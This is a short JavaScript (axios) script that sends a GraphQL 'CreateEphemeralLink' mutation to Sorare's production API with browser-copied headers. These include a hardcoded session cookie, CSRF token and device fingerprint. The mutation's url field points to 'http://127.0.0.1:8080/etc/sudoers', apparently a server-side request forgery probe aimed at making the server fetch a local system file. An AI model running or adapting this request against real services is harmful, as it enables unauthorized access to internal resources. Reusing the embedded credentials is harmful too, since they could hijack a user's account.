const axios = require("axios");

const url = "https://api.sorare.com/federation/graphql";
const headers = {
  "Content-Type": "application/json",
  Cookie:
    "_sorare_session_id=lxnexWa8sq4x%2FkD6CD08cFfqEO0tEM9BrAgw1sGv3qg9BL7gsBgnnrkBDO4ISy6QvooT6jv6dsHw24JaZ00yVM4loRnxQddQsU3dIWCS0vA%2F5eAsPZFvZY%2ByhgsNIA6vL9B6lBuTms4AZ7pyl8EDtcop4Dz3GIrVlky8g8tavIGu6ftkrPHIhDggoZebtwW9qdq3ZJ621DfgIK9rPDWuZ%2FT5ryUIM9ZK7n8SazXfZkR0%2BBqoS8SDRzboOdxZpnxB2eIXDCNLuJ1h9qkC5HNvt%2B3GzZQSYQdbiSdMnWRnA%2FH4UjWKf3GiVO4tIiD8CbHKpEqCtDv9Gxxe2JAiZVHIZbneT5UQxLIQJOd9Bj3%2BCI045Vho07dseIwmqR6ADDV3q9zdJcWQ7s94F5k5BGnX%2FLmHCbbx%2BuR4NUNEmR6IQSk4WC9aefaG6YDV9cOCJXLGMaC0m7QOv5dmdd4V1ESWW6MhV8T818V3OOXzsh7cOR1BrSd3Lr%2FJ1rsTO45%2BRKK0C6kePdWPA8hXlgoC%2Fk3JoWbqxlxrpQR3hqsNw1BGM8aWhff1m77HhbmapX1Pp18asgMoMLJqXO%2BhgLoB2NsDUoUPwbQDm09Nt%2BsXwYCXip11nGiS--e27g63owxFcpNzqw--Vp5EDhY%2FjEpIkJHkRf6jHA%3D%3D; csrftoken=LBTGmg7JOaHcBGXy0WE1qrxSMsOp4RVg6UHIQmSB4XGv4DsCdm_GPIu_nN-5sEYjfX5spyj7gjbBZ-bDkXGEqg",
  "User-Agent":
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
  Accept: "application/json, text/plain, */*, application/json",
  Referer: "https://sorare.com/",
  "Sorare-Client": "Web",
  "Sorare-Version": "20241227040755",
  "Sorare-Build": "a4d2ee851a389d5a0595eb5765f7d37826627801",
  "Sorare-Tab-Version": "ea3420241227225242z",
  Device_fingerprint:
    "972315ff06bb426b5b8efca2e59be4dc,85e277943f41ed51aab8e87c17831f0b",
  "X-Csrf-Token":
    "LBTGmg7JOaHcBGXy0WE1qrxSMsOp4RVg6UHIQmSB4XGv4DsCdm_GPIu_nN-5sEYjfX5spyj7gjbBZ-bDkXGEqg",
  "Sentry-Trace": "532e1a3ed4574ca7a2f1474f3f748029-bf4bc6c6d06cddea-0",
  Baggage:
    "sentry-environment=prod,sentry-release=a4d2ee851a389d5a0595eb5765f7d37826627801,sentry-public_key=6aa84363323647f78159a04b60f11ffe,sentry-trace_id=532e1a3ed4574ca7a2f1474f3f748029,sentry-sampled=false",
  "Content-Length": "235",
  Origin: "https://sorare.com",
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Site": "same-site",
  Priority: "u=0",
  Te: "trailers",
};

const data = {
  operationName: "CreateEphemeralLink",
  variables: {
    input: {
      url: "http://127.0.0.1:8080/etc/sudoers",
      tokenAsQueryParam: false,
    },
  },
  extensions: {
    operationId:
      "React/9918377e43a6ace255d7d43585c8d14d69c5541408d681c178aed22af4c67365",
  },
};

axios
  .post(url, data, { headers })
  .then((response) => {
    console.log(JSON.stringify(response));
  })
  .catch((error) => {
    console.log(JSON.stringify(error));
  });
